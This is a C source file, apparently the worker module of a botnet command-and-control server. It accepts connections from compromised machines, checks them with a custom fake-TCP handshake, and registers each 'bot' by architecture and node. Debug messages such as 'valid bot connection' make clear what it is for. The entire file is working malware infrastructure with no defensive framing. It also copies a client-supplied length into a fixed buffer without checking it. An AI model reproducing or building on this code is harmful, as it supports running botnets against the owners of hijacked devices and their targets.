#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <netdb.h>
#include <unistd.h>
#include <ctype.h>
#include <fcntl.h>
#include <errno.h>
#include <pthread.h>
#include <glob.h>
#include <signal.h>
#include <arpa/inet.h>
#include <sys/epoll.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <linux/sysctl.h>
#include <sys/stat.h>
#include <sys/sendfile.h>

#include "client.h"
#include "command.h"

volatile int epoll_fd = 0, listen_fd = 0;

int worker_create_and_bind(char *port)
{
	struct addrinfo hints;
	struct addrinfo *result, *rp;
	int s, sfd;

	memset(&hints, 0, sizeof (struct addrinfo));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
    hints.ai_flags = AI_PASSIVE;
    s = getaddrinfo(NULL, port, &hints, &result);

    if (s != 0)
		return -1;

	for (rp = result; rp != NULL; rp = rp->ai_next)
	{
		sfd = socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol);
		if (sfd == -1)
			continue;

		int yes = 1;
		if (setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1)
        {
#ifdef DEBUG
            printf("[worker] failed getsockopt()\n");
#endif
            exit(0);
        }

		s = bind(sfd, rp->ai_addr, rp->ai_addrlen);
		if (s == 0)
			break;

		close(sfd);
	}

	if (rp == NULL)
		return -1;
	else
	{
		freeaddrinfo(result);
		return sfd;
	}
}

void worker_cleanup_connection(struct clientdata_t *conn)
{
	close(conn->fd);
	conn->fd = 0;
	conn->connected = 0;
    conn->arch_len = 0;
    conn->scanning = 0;
	conn->timeout = 0;
	conn->node = 0;
	conn->authed = 0;
	conn->stage = CLIENT_FIRST_CONN;
    memset(conn->arch, 0, sizeof(conn->arch));
}

unsigned int worker_checksum(unsigned short int *cksum_arr)
{
    unsigned int i, sum = 0, cksum;

    for (i = 0; i < 12; i++)
        sum = sum + cksum_arr[i];

    cksum = sum >> 16;
    sum = sum & 0x0000FFFF;
    sum = cksum + sum;
    cksum = sum >> 16;
    sum = sum & 0x0000FFFF;
    cksum = cksum + sum;

    return cksum;
}

void worker_print(struct tcp_hdr *tcp_seg)
{
	printf("[worker] valid bot connection (chk=0x%X)\n", tcp_seg->cksum);
	return;
}

void *worker_event(void *arg)
{
	struct epoll_event event;
	struct epoll_event *events;

    events = calloc(CLIENT_MAXFDS, sizeof event);

    while (1)
    {
		int n, i;
		n = epoll_wait(epoll_fd, events, CLIENT_MAXFDS, -1);

		for (i = 0; i < n; i++)
		{
			if ((events[i].events & EPOLLERR) || (events[i].events & EPOLLHUP) || (!(events[i].events & EPOLLIN)))
			{
				worker_cleanup_connection(&clients[events[i].data.fd]);
				continue;
			}
			else if (listen_fd == events[i].data.fd)
			{
               	while (1)
               	{
               		int accept_fd, s;
					struct sockaddr in_addr;
	                socklen_t in_len = sizeof(in_addr);

					if ((accept_fd = accept(listen_fd, &in_addr, &in_len)) == -1)
					{
						if ((errno == EAGAIN) || (errno == EWOULDBLOCK))
							break;
                    	else
                        {
#ifdef DEBUG
                            printf("[worker] failed to accept() listen_fd\n");
#endif
                            close(accept_fd);
    						exit(0);
                        }
					}

					if ((s = fcntl(accept_fd, F_SETFL, fcntl(accept_fd, F_GETFL, 0) | O_NONBLOCK)) == -1)
					{
#ifdef DEBUG
                        printf("[worker] failed to set accept_fd to non-blocking\n");
#endif
						close(accept_fd);
						exit(0);
					}

					event.data.fd = accept_fd;
					event.events =  EPOLLIN | EPOLLET;

					if ((s = epoll_ctl(epoll_fd, EPOLL_CTL_ADD, accept_fd, &event)) == -1)
					{
#ifdef DEBUG
                        printf("[worker] failed epoll_clt()\n");
#endif
                        close(accept_fd);
						exit(0);
					}

					clients[event.data.fd].timeout = time(NULL) + CLIENT_HANDSHAKE_TIMEOUT;
					clients[event.data.fd].connected = 1;
                    clients[event.data.fd].scanning = 0;
					clients[event.data.fd].stage = CLIENT_FIRST_CONN;
					clients[event.data.fd].fd = event.data.fd;
				}
				continue;
			}
            else
			{
				int end = 0, fd = events[i].data.fd;

				while (1)
				{
					char buf[255];
					int count;

					while ((count = recv(fd, buf, sizeof(buf), MSG_NOSIGNAL)) > 0)
					{
						if (clients[events[i].data.fd].stage == CLIENT_FIRST_CONN)
						{
							struct tcp_hdr tcphdr;
							unsigned short int chksum[12];

							memcpy(&tcphdr, buf, sizeof(tcphdr));

							if (tcphdr.seq != 18456 && tcphdr.des != 31337)
							{
								memset(buf, 0, sizeof(buf));
								memset(&tcphdr, 0, sizeof(tcphdr));
								count = 0;
								break;
							}

							tcphdr.hdr_flags = (0x01 | 0x02);
							tcphdr.ack = tcphdr.seq + 1;
							tcphdr.seq = 28913;
							tcphdr.src = tcphdr.des;
							tcphdr.des = tcphdr.src;

							memcpy(chksum, &tcphdr, 24);
							tcphdr.cksum = worker_checksum(chksum);

							memset(buf, 0, sizeof(buf));
							memcpy(buf, &tcphdr, sizeof(tcphdr));
							send(clients[events[i].data.fd].fd, buf, 255, MSG_NOSIGNAL);
							memset(&tcphdr, 0, sizeof(tcphdr));
							clients[events[i].data.fd].stage = CLIENT_ACK_SEQ;
						}
						else if (clients[events[i].data.fd].stage == CLIENT_ACK_SEQ)
						{
							struct tcp_hdr tcphdr;
							unsigned short int chksum[12];

							memcpy(&tcphdr, buf, sizeof(tcphdr));

							if (tcphdr.ack != 28914)
							{
								memset(buf, 0, sizeof(buf));
								memset(&tcphdr, 0, sizeof(tcphdr));
								count = 0;
								break;
							}

							tcphdr.hdr_flags = (0x01 | 0x02);
							tcphdr.ack = tcphdr.seq + 1;
							tcphdr.seq = 10101;
							tcphdr.src = tcphdr.des;
							tcphdr.des = tcphdr.src;

							memcpy(chksum, &tcphdr, 24);
							tcphdr.cksum = worker_checksum(chksum);

							memset(buf, 0, sizeof(buf));
							memcpy(buf, &tcphdr, sizeof(tcphdr));
							send(clients[events[i].data.fd].fd, buf, 255, MSG_NOSIGNAL);
							worker_print(&tcphdr);
							memset(&tcphdr, 0, sizeof(tcphdr));
							clients[events[i].data.fd].authed = 1;
							clients[events[i].data.fd].stage = CLIENT_COMPLETE;
						}
						else if (clients[events[i].data.fd].stage == CLIENT_COMPLETE)
						{
							if (buf[0] == '\x00')
							{
								char sendbuf[1024];
								int send_len;

								if (clients[events[i].data.fd].arch_len <= 0)
								{
									strcpy(sendbuf, "\x01");
									send_len = 1;
								}
								else
								{
									strcpy(sendbuf, "\x00");
									send_len = 1;
								}

								send(clients[events[i].data.fd].fd, sendbuf, send_len, MSG_NOSIGNAL);
								memset(sendbuf, 0, sizeof(sendbuf));
								clients[events[i].data.fd].timeout = time(NULL) + CLIENT_PING_TIMEOUT;
							}
							else if (buf[0] == '\x01')
							{
								memcpy(&clients[events[i].data.fd].arch_len, buf + 1, sizeof(uint16_t));
								memcpy(&clients[events[i].data.fd].node, buf + 1 + sizeof(uint16_t), sizeof(uint16_t));
								memcpy(clients[events[i].data.fd].arch, buf + 1 + (sizeof(uint16_t) * 2), clients[events[i].data.fd].arch_len);
#ifdef DEBUG
								printf("[worker] bot registered on node %d with name %s\r\n", clients[events[i].data.fd].node, clients[events[i].data.fd].arch);
#endif
							}
						}
                    }

                    memset(buf, 0, sizeof(buf));

					if (count == -1)
					{
						if (errno != EAGAIN)
                            worker_cleanup_connection(&clients[events[i].data.fd]);

						break;
					}
					else if (count == 0)
					{
                        worker_cleanup_connection(&clients[events[i].data.fd]);
						break;
					}
				}
			}
		}
	}
}

void worker_init(int threads)
{
    struct epoll_event event;
    int s;

#ifdef DEBUG
    printf("[worker] instalizing bot workers (%d threads)\n", threads);
#endif

    if ((listen_fd = worker_create_and_bind(CLIENT_WORKER_PORT)) == -1)
    {
#ifdef DEBUG
        printf("[worker] failed to bind bot worker\n");
#endif
        exit(0);
    }

    if ((s = fcntl(listen_fd, F_SETFL, fcntl(listen_fd, F_GETFL, 0) | O_NONBLOCK)) == -1)
    {
#ifdef DEBUG
        printf("[worker] failed to set accept_fd to non-blocking\n");
#endif
        close(listen_fd);
        exit(0);
    }

    if ((s = listen(listen_fd, SOMAXCONN)) == -1)
    {
#ifdef DEBUG
        printf("[worker] failed to listen on listen_fd\n");
#endif
        close(listen_fd);
        exit(0);
    }

    if ((epoll_fd = epoll_create1(0)) == -1)
    {
#ifdef DEBUG
        printf("[worker] failed to call epoll_create1()\n");
#endif
        close(listen_fd);
        exit(0);
    }

    event.data.fd = listen_fd;
    event.events =  EPOLLIN | EPOLLET;

    if ((s = epoll_ctl(epoll_fd, EPOLL_CTL_ADD, listen_fd, &event)) == -1)
    {
#ifdef DEBUG
        printf("[worker] failed to add listen_fd to epoll worker\n");
#endif
        close(listen_fd);
        exit(0);
    }

    pthread_t thread[threads];
    while (threads--)
        pthread_create(&thread[threads], NULL, &worker_event, (void *)NULL);
}
